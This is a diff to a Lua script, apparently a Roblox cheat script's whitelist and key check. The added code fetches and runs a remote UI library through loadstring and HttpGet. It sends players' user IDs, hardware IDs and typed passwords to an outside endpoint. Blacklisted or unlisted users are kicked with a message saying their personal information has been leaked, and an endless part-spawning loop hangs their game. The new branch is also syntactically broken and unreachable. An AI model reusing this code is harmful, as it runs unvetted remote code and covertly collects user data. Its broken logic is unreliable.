@@ -9,8 +9,32 @@ local UName = plre.Name
 local WV = "false"
 local status = "nil"
 local Countries = {}
+local inserted = ""
 
-local maks = "maksimmilana22"
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "Password", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+    Name = "Access",
+    Icon = "nil",
+    PremiumOnly = false
+ 
+})
+
+Tab:AddTextbox({
+	Name = "Enter Password",
+	Default = "eg 123",
+	TextDisappear = false,
+	Callback = function(Value)
+		inserted = Value
+	end	  
+})
+
+Tab:AddButton({
+	Name = "Enter Key",
+	Callback = function()
+       local maks = "maksimmilana22"
 
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -36,14 +60,23 @@ local allowed = {
   553962330
 }
 
+local passwords = {
+    "sugercoat"
+}
+
 local blacklisted = {"b997b340-4056-40ce-bae7-95ce083d6465", 140378057}
+
+local fraud = false
 
 if table.find(allowed, S_hwid) or table.find(allowed, plr.UserId) then
   WV = "Yes"
 elseif table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId) then
   WV = "Blacklisted"
-elseif not (table.find(allowed, S_hwid) or table.find(allowed, plr.UserId)) or not (table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId)) then 
+elseif not (table.find(allowed, S_hwid) or table.find(allowed, plr.UserId)) or not (table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId)) then
   WV = "No"
+elseif table.find(passwords, inserted) and not ((table.find(allowed, S_hwid) or table.find(allowed, plr.UserId) or not (table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId))
+  WV = "No"
+  local fraud = true
 end
 
 local embedcolor
@@ -69,6 +102,10 @@ elseif WV == "No" then
   status = "Not whitelisted"
 end
 
+if fraud then
+    status = "Got password from someone."
+end
+
 if not S_hwid then
     S_hwid = "Unknown"
 end
@@ -92,7 +129,7 @@ local response =
                         ["fields"] = {
                            {
                        ["name"] = "Information",
-                       ["value"] = "UserId: "..tostring(plr.UserId)
+                       ["value"] = "UserId: "..tostring(plr.UserId).."\n Password Inserted: "..tostring(inserted)
                            },
                            {
                         ["name"] = "Hardware Id",
@@ -116,4 +153,9 @@ if WV == "Blacklisted" then
   plr:Kick("Your personal information has now been leaked") ME:FireServer(SoundEvent) while true do local part = Instance.new("Part", workspace) part.Name = "FUCKYOU" end
 elseif WV == "No" then
   plr:Kick("You are not whitelisted.") ME:FireServer(SoundEvent) while true do local part = Instance.new("Part", workspace) part.Name = "FUCKYOU" end
-end
+end 
+  	end    
+})
+
+
+
